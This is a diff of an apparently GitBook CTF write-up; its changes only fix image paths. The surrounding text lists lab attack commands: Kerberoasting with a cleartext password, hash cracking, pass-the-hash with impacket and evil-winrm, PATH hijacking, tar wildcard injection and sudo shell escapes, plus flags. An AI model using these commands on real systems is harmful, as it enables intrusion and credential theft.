@@ -4,11 +4,11 @@
 
 ## Challenge 1 Web
 
-<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 nc -vn 3.219.168.38 8888
 
@@ -370,7 +370,7 @@ READ:../../../../../../etc/environment
 
 PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 You have SSH access as a user inside the linux machine, connect to the server and find the first flag at the home folder of "flagkeeper".
 
@@ -396,7 +396,7 @@ sudo find /root -name flag.txt -exec cat {} \\;
 
 **CTF{r3g1stry\_s3cr3ts\_3xp0s3d}**
 
-<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Round 2
 
@@ -430,11 +430,11 @@ Submit the vulnerable username e.g. ( John Doe)
 
 impacket-GetADUsers -all -dc-ip 44.210.83.134 iceberg.local/zara.hall:"WeAreOne\\!9@8#7"
 
-<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 impacket-GetUserSPNs -request -dc-ip 44.210.83.134 iceberg.local/zara.hall:"WeAreOne\\!9@8#7"
 
@@ -450,9 +450,9 @@ MSSQLSvc/SQL01.iceberg.local:1433 sql\_svc 2026-02-10 04:51:01.934855 2026-02-12
 
 $krb5tgs$23$\*sql\_svc$ICEBERG.LOCAL$iceberg.local/sql\_svc\*$92a5d74271838f72fa3d55f27a17cca6$cbd60d4c48c54dfc88cedc7e29da21b0517d77d90698c412135623c30232478f61e8456092baf0bfc553faa9bb1cd81c1554623dc25a2e9a96fb8f10f9e46a271f92e275a42fb893dd1b35ca2f76907039760f6b8988009fc86c66993d07efc6fffd510a23cc718922b8029db7ad0b3444d67ede9c60c9d876d095a9777a82620bbe292ec9775b11a4379f763b91d78495422af5c63c142b2e8b3a532804ff0fcd975f9f97466d41b49f718c1ce0e0ff3bea96e3a9b5326ad0f3292115cd10d0fc9335096d8b549375106d24911f2120228f51c9e22086bc0fb604eaf31a76ae69277d25cc23debe8e3553a6dc6220b0f268624fc765c028f59002d9145b0ebe6ab9848f46ca4415a2279a3b38b484f862a24e1a8d594f8222ff9f998626d5c4834376ef2cb16256d39d9d4834df7d593109ae291ac00f775afcdfd8c9bc8d0e645e67b1b2e24a461cee7ef0539a54bb455c1ff970f6d5b944cbcd542abcfea13d7aa2fa0673569632d33e866cda917ce3e5a996904522acdd7440f1dd9d4fbfa52316bc72cb8eed0f3c434bba66c7d11762e2e2c64392d2563e410f8473fcbff8550afbd9d4aa2ac8e0d1e211d296ebcfd7965ad0507c6a5a4ef94539945b76383691952e76a1caa0edc69d2b6b46b04a9ccd4288bd1b876b370320ca4e69afc12cc723275d1dfccfceaf7e12ead06ced58d7fcc47faa49a4c77c47c5376ae841dd1a2f310e541f0a8c4518ca2ac74984fd16b6b2b7b0a5a8856b06d0bd53dee14a947450eede0de899edee11f9c3d029ed9e9c5b33c06d99928f239f0e7695018bf0160e6d964dc38f23ab33c4b9c0d9d1c332eb34e2f7cd29fa847dd197617622841b044fb75f7e597b83801866af4fa8bab0209503db0b547dbf71e1f7b353154ff5623088307e80510c7a5a4b27374bf272cb2d521afea01b4c96348c51a2dd691db39bc7af4bf9758a0f22e9b18c5d5bb034e6b86ba6ba39e054c31344c6c04a7248d13c3d53f842b647966ca606623919e3288ec09f92029575b3b43680af2dd47762c2227194ddaf924e1d67a5a9707556e6bc2acbc31e74ab91d5cfe277c13a94cb7367ee9f100bcb4914425c4c332a30addf40debe018a86b2693672847111a84de0c215dfa47d109efd6df62a28b2009a2635ed410015d8d1ea3f5ddf599ffacb7329a81141f3b025664e05c873ac511a6c86f5eb0c1112fdb64c2a60865c5f2be6c6f3487df4ac9545f9827b07d27bdb7da97847651b7dc2521eef8327487e68261c9263be04d2e0040a9de452f0cfd2ad06fef1825b3b131e00b9d0f74dd22e3b868d80e5e97959642e39fa09398a5398e59412e15034d0b9b76dabcac32f84836870199158162105f57346c45719ceeb757797185fea5d7bbd7d84f2ca121ed089b4a9bd24153b29a4df22c795b73da75bb083e331eca8ae0e5cf3cadd5fc492fcea5011d3511cb549a7d64586e8d3dc0633f4af82733120217808067502b5133bbe33e1c8b768cb
 
-<figure><img src=".gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 The Magician23:41:58
 
@@ -464,7 +464,7 @@ Submit the password you got from the hash. (e.g. IAmStrongPassword123)
 
 mousepad mission2tgs.hash
 
-<figure><img src=".gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 john --wordlist=/usr/share/wordlists/rockyou.txt mission2tgs.hash
 
@@ -484,7 +484,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 
 Session completed.
 
-<figure><img src=".gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 The Magician23:50:41
 
@@ -496,31 +496,31 @@ Asset Name:WIN10-EXEC01
 
 Submit the name File located in the administrator Desktop . (e.g. administrator.txt)
 
-![](<.gitbook/assets/unknown (10) (1).png>)
+![](<../.gitbook/assets/unknown (10) (1).png>)
 
 sudo nano /etc/hosts
 
-![](<.gitbook/assets/unknown (11) (1).png>)
+![](<../.gitbook/assets/unknown (11) (1).png>)
 
-![](<.gitbook/assets/unknown (12) (1).png>)
+![](<../.gitbook/assets/unknown (12) (1).png>)
 
-![](<.gitbook/assets/unknown (13) (1).png>)
+![](<../.gitbook/assets/unknown (13) (1).png>)
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 impacket-smbclient -hashes :5f754bcffe28b5bb5a1581d9bbd4e98c 'iceberg.local/WIN10-EXEC01$@44.210.83.134'
 
 impacket-secretsdump -hashes :5f754bcffe28b5bb5a1581d9bbd4e98c 'iceberg.local/WIN10-EXEC01$@44.221.50.166'
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 evil-winrm -i 44.221.50.166 -u 'TARGET\_USER' -H '\<HASH\_FROM\_CERTIPY>'
 
-<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
 Btw, I know is iceberg.local because cannot connect to rdp, then I saw iceberg.local domain.
 
@@ -542,12 +542,12 @@ Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
 
 developer@privesc-medium:\~$ nano exploit.py
 
-![](<.gitbook/assets/unknown (1).png>)
+![](<../.gitbook/assets/unknown (1).png>)
 
 developer@privesc-medium:\~$ chmod +x exploit.py
 
 \
-![](<.gitbook/assets/image (2).png>)
+![](<../.gitbook/assets/image (2).png>)
 
 The Magician02:23:12
 
@@ -570,12 +570,12 @@ Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
 \
 find / -perm -4000 -type f -not -path "/proc/\*" -not -path "/sys/\*" 2>/dev/null
 
-![](<.gitbook/assets/unknown (2).png>)
+![](<../.gitbook/assets/unknown (2).png>)
 
 \
 strings $(find / -perm -4000 -type f -not -path "/proc/\*" -not -path "/sys/\*" 2>/dev/null) | grep -E "^\w+/.\*$"
 
-![](<.gitbook/assets/unknown (3).png>)
+![](<../.gitbook/assets/unknown (3).png>)
 
 <br>
 
@@ -589,7 +589,7 @@ chmod +x /tmp/ls
 
 <br>
 
-![](<.gitbook/assets/unknown (4).png>)
+![](<../.gitbook/assets/unknown (4).png>)
 
 <br>
 
@@ -597,13 +597,13 @@ export PATH="/tmp:$PATH"
 
 <br>
 
-![](<.gitbook/assets/unknown (5).png>)
+![](<../.gitbook/assets/unknown (5).png>)
 
 <br>
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-![](<.gitbook/assets/unknown (6).png>)
+![](<../.gitbook/assets/unknown (6).png>)
 
 The Magician02:48:28
 
@@ -611,11 +611,11 @@ Mission 3: Wildcard Injection
 
 Exploit wildcard characters in automated cron scripts. Tar and chown commands process files with dangerous wildcards - create malicious filenames to execute arbitrary commands as root.
 
-<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-![](<.gitbook/assets/unknown (7).png>)
+![](<../.gitbook/assets/unknown (7).png>)
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 developer@wildcard-medium:\~$ touch /home/developer/--checkpoint=1
 
@@ -623,15 +623,15 @@ developer@wildcard-medium:\~$ touch /home/developer/--checkpoint-action=exec=sh\
 
 <br>
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 Answer: cyberolympians{wildc4rd\_1nj3ct10n\_t4r\_pwn4g3\_2025}
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 The Magician03:07:39
 
@@ -651,17 +651,17 @@ Password: P@ssw0rd!2025WebDev
 
 Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
 
-![](<.gitbook/assets/image (10).png>)<br>
+![](<../.gitbook/assets/image (10).png>)<br>
 
-<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
-![](<.gitbook/assets/unknown (9).png>)
+![](<../.gitbook/assets/unknown (9).png>)
 
-![](<.gitbook/assets/unknown (10).png>)
+![](<../.gitbook/assets/unknown (10).png>)
 
 TF=$(mktemp)
 
@@ -688,17 +688,17 @@ drwxr-xr-x 2 root root 4096 Oct 13 14:03 .
 drwxr-xr-x 1 root root 4096 Dec 31 08:58 ..
 
 \
-![](<.gitbook/assets/unknown (11).png>)
+![](<../.gitbook/assets/unknown (11).png>)
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 <br>
 
-![](<.gitbook/assets/unknown (12).png>)
+![](<../.gitbook/assets/unknown (12).png>)
 
 <br>
 
-![](<.gitbook/assets/unknown (13).png>)
+![](<../.gitbook/assets/unknown (13).png>)
 
 <br>
 
@@ -727,13 +727,13 @@ Password:P@ssw0rd!2025WebDev
 Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
 
 \
-![](<.gitbook/assets/image (14).png>)
+![](<../.gitbook/assets/image (14).png>)
 
 getcap -r / 2>/dev/null
 
 <br>
 
-![](<.gitbook/assets/unknown (14).png>)
+![](<../.gitbook/assets/unknown (14).png>)
 
 <br>
 
@@ -741,20 +741,20 @@ getcap -r / 2>/dev/null
 
 <br>
 
-![](<.gitbook/assets/unknown (15).png>)
+![](<../.gitbook/assets/unknown (15).png>)
 
 <br>
 
-![](<.gitbook/assets/unknown (16).png>)
+![](<../.gitbook/assets/unknown (16).png>)
 
 <br>
 
 /opt/.system/tools/legacy/deprecated/old\_utils/py3\_legacy -c 'print(open("/etc/sudoers").read())'
 
 \
-![](<.gitbook/assets/image (15).png>)
+![](<../.gitbook/assets/image (15).png>)
 
-<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
 If you find a binary listed with NOPASSWD, you can immediately escalate to root. For example, if secadmin can run find as root:
 
@@ -762,7 +762,7 @@ su secadmin (once you crack the hash)
 
 sudo find . -exec /bin/sh -p \\; -quit
 
-![](<.gitbook/assets/image (17).png>)\
+![](<../.gitbook/assets/image (17).png>)\
 /opt/.system/tools/legacy/deprecated/old\_utils/py3\_legacy -c 'import os; print(\[os.path.join(dp, f) for dp, dn, filenames in os.walk("/root") for f in filenames])'
 
 \['/root/.bashrc', '/root/.profile', '/root/.credentials.enc']
@@ -775,9 +775,9 @@ b'U2FsdGVkX19h/IuxRZZwH/l4O33HaLw3XSmWmsEEzrOt5lC8JnAOIo3fkrd+HeL2\n'
 
 <br>
 
-![](<.gitbook/assets/unknown (17).png>)
+![](<../.gitbook/assets/unknown (17).png>)
 
-![](<.gitbook/assets/unknown (18).png>)
+![](<../.gitbook/assets/unknown (18).png>)
 
 <br>
 
@@ -800,7 +800,7 @@ Password: P@ssw0rd!2025WebDev
 Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
 
 \
-![](<.gitbook/assets/image (1).png>)
+![](<../.gitbook/assets/image (1).png>)
 
 gdb /opt/challenges/level3/vuln
 
@@ -826,11 +826,11 @@ Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
 
 <br>
 
-![](<.gitbook/assets/unknown (19).png>)
+![](<../.gitbook/assets/unknown (19).png>)
 
 cyberolympians{sh4r3d\_0bj3ct\_1nj3ct\_ld\_libr4ry\_pwn\_2025}
 
-<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 The Magician04:39:54
 
